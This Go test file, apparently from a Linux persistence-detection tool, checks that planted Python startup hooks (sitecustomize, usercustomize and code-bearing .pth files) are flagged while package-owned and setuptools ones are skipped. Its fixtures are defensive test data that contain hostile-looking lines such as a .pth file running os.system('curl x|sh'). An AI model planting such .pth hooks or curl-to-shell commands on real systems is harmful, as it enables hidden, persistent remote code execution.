package runtimeinit

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/jarmidaw/linpersist/internal/core"
)

var fixedNow = time.Date(2026, 5, 12, 10, 0, 0, 0, time.UTC)

type stubProv struct{ owned map[string]bool }

func (stubProv) Warmup(context.Context) {}
func (s stubProv) LookupPath(p string) (string, core.PkgStatus) {
	if s.owned[p] {
		return "python3-x", core.PkgStatusOwned
	}
	return "", core.PkgStatusOrphan
}

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func collect(t *testing.T, root string, owned ...string) map[string]core.Record {
	t.Helper()
	ow := map[string]bool{}
	for _, o := range owned {
		ow[o] = true
	}
	m := New(Options{Root: root, Now: func() time.Time { return fixedNow }, Provenance: stubProv{owned: ow}})
	out := map[string]core.Record{}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := m.Collect(ctx, func(r core.Record) { out[r.Locus] = r }); err != nil {
		t.Fatalf("Collect: %v", err)
	}
	return out
}

func hasSig(r core.Record, s string) bool {
	for _, x := range r.Signals {
		if x == s {
			return true
		}
	}
	return false
}

func TestSitecustomize_PlantedVsOwned(t *testing.T) {
	root := t.TempDir()
	// Planted sitecustomize on a dist-packages dir (unowned) -> flagged.
	write(t, root, "usr/lib/python3.12/dist-packages/sitecustomize.py", "import os\nos.system('x')\n")
	// Shipped sitecustomize at the lib root (owned) -> silent.
	write(t, root, "usr/lib/python3.12/sitecustomize.py", "# debian default\n")
	recs := collect(t, root, "/usr/lib/python3.12/sitecustomize.py")

	planted, ok := recs["/usr/lib/python3.12/dist-packages/sitecustomize.py"]
	if !ok {
		t.Fatalf("planted sitecustomize not collected; got %v", keys(recs))
	}
	if planted.SiteClass != siteClassPython || planted.ExecTarget != planted.Locus {
		t.Errorf("bad record: site=%q exec_target=%q", planted.SiteClass, planted.ExecTarget)
	}
	if !hasSig(planted, core.SignalNonPackagePath) {
		t.Errorf("planted sitecustomize missing non_package_path; %v", planted.Signals)
	}
	owned, ok := recs["/usr/lib/python3.12/sitecustomize.py"]
	if !ok {
		t.Fatalf("owned sitecustomize should still produce a record")
	}
	if hasSig(owned, core.SignalNonPackagePath) {
		t.Errorf("owned sitecustomize must NOT carry non_package_path")
	}
}

func TestPth_CodeLineVsPathOnly(t *testing.T) {
	root := t.TempDir()
	// Code .pth (import line) -> a record.
	write(t, root, "usr/lib/python3/dist-packages/evil.pth", "import os; os.system('curl x|sh')\n")
	// Plain path-list .pth (sys.path addition only) -> NO record (LFA-only).
	write(t, root, "usr/lib/python3/dist-packages/paths.pth", "/opt/somelib\n../another\n")
	recs := collect(t, root)
	if _, ok := recs["/usr/lib/python3/dist-packages/evil.pth"]; !ok {
		t.Errorf("code .pth not collected; got %v", keys(recs))
	}
	if _, ok := recs["/usr/lib/python3/dist-packages/paths.pth"]; ok {
		t.Errorf("path-only .pth must NOT be collected (search-path injection is LFA-only)")
	}
}

func TestUsercustomizeUserDir(t *testing.T) {
	root := t.TempDir()
	write(t, root, "home/alice/.local/lib/python3.11/site-packages/usercustomize.py", "import evil\n")
	recs := collect(t, root)
	if r, ok := recs["/home/alice/.local/lib/python3.11/site-packages/usercustomize.py"]; !ok {
		t.Errorf("per-user usercustomize not collected; got %v", keys(recs))
	} else if !hasSig(r, core.SignalNonPackagePath) {
		t.Errorf("unowned usercustomize missing non_package_path")
	}
}

func TestNonHookFilesIgnored(t *testing.T) {
	root := t.TempDir()
	write(t, root, "usr/lib/python3.12/os.py", "import sys\n")              // a normal module, not a hook
	write(t, root, "usr/lib/python3.12/dist-packages/foo/__init__.py", "x") // nested module
	recs := collect(t, root)
	if len(recs) != 0 {
		t.Errorf("non-hook python files must be ignored; got %v", keys(recs))
	}
}

func keys(m map[string]core.Record) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestSymlinkedSitecustomize mirrors Debian's real layout: the site-dir
// sitecustomize.py is a symlink to /etc/pythonX/sitecustomize.py. It must
// be collected (followed), not skipped as non-regular.
func TestSymlinkedSitecustomize(t *testing.T) {
	root := t.TempDir()
	// The real target lives outside any python site dir.
	write(t, root, "etc/python3.12/sitecustomize.py", "import apport_python_hook\n")
	linkDir := filepath.Join(root, "usr/lib/python3.12")
	if err := os.MkdirAll(linkDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(root, "etc/python3.12/sitecustomize.py"),
		filepath.Join(linkDir, "sitecustomize.py")); err != nil {
		t.Fatal(err)
	}
	recs := collect(t, root) // unowned -> flagged
	r, ok := recs["/usr/lib/python3.12/sitecustomize.py"]
	if !ok {
		t.Fatalf("symlinked sitecustomize not collected; got %v", keys(recs))
	}
	if r.ExecTarget != "/usr/lib/python3.12/sitecustomize.py" {
		t.Errorf("ExecTarget should be the site-dir path, got %q", r.ExecTarget)
	}
}

// TestSetuptoolsPlumbingSkipped is the duel-final HIGH fix: pip editable /
// setuptools .pth (ubiquitous on dev/CI boxes) must NOT be collected, or
// they each fire a HIGH Q7 verdict with zero true positives.
func TestSetuptoolsPlumbingSkipped(t *testing.T) {
	root := t.TempDir()
	write(t, root, "usr/lib/python3.11/site-packages/__editable__.myproj-1.0.pth",
		"import __editable___myproj_1_0_finder; __editable___myproj_1_0_finder.install()\n")
	write(t, root, "usr/lib/python3.11/site-packages/distutils-precedence.pth",
		"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; __import__('_distutils_hack').add_shim()\n")
	// A genuinely malicious .pth must STILL be collected.
	write(t, root, "usr/lib/python3.11/site-packages/zz-evil.pth", "import os; os.system('curl x|sh')\n")
	recs := collect(t, root)
	if _, ok := recs["/usr/lib/python3.11/site-packages/__editable__.myproj-1.0.pth"]; ok {
		t.Error("__editable__ .pth must be skipped (pip editable plumbing)")
	}
	if _, ok := recs["/usr/lib/python3.11/site-packages/distutils-precedence.pth"]; ok {
		t.Error("distutils-precedence.pth must be skipped (setuptools plumbing)")
	}
	if _, ok := recs["/usr/lib/python3.11/site-packages/zz-evil.pth"]; !ok {
		t.Error("a real malicious .pth must still be collected")
	}
}
